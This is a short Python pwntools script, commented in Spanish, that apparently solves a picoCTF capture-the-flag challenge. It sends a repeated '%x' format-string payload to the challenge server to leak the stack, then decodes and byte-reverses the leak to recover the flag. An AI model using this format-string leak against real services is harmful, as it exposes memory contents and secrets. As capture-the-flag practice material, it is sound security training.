from pwn import *

s = "" #Declaramos la cadena vacia

#Nos conectamos al target
io = remote('mercury.picoctf.net', 6989)

#Creamos un payload que nos filtrara la pila
payload = 30 * "%x" + "\n"

#Ejecutamos el payload que nos exfiltrara la pila
io.sendlineafter('portfolio', '1')
io.sendlineafter('?', payload)

#Nos quitamos la linea que nos sobra a mano
io.recvline()
io.recvline()


#Recibimos los caracteres que nos interesan
hexCode = io.recvline()

#Ahora necesitamos que por cada 4 le tenemos que dar la vuelta para cambiar los endians
asci = hexCode.decode()
asci = asci[:-1]
byte_array = bytearray.fromhex(asci)
final = byte_array.decode('utf-8', errors='replace')

for i in final:
    if i.isprintable():
        s+= i

nuevaCadena = ""
encontrado = 0

for i in s:
    if i == 'o' or encontrado == 1:
        encontrado = 1
        nuevaCadena += i

print(nuevaCadena)

cadenaOriginal=nuevaCadena

# Dividir la cadena en bloques de 4 caracteres
bloques = [cadenaOriginal[i:i+4] for i in range(0, len(cadenaOriginal), 4)]

# Revertir cada bloque y unirlos
cadenaCorrecta = ''.join(bloque[::-1] for bloque in bloques)

flag = ""

for i in cadenaCorrecta:
    try:
        inti = ord(i)
        if(inti) in range(32,126):
            flag += i
    except ValueError:
        pass

print(flag)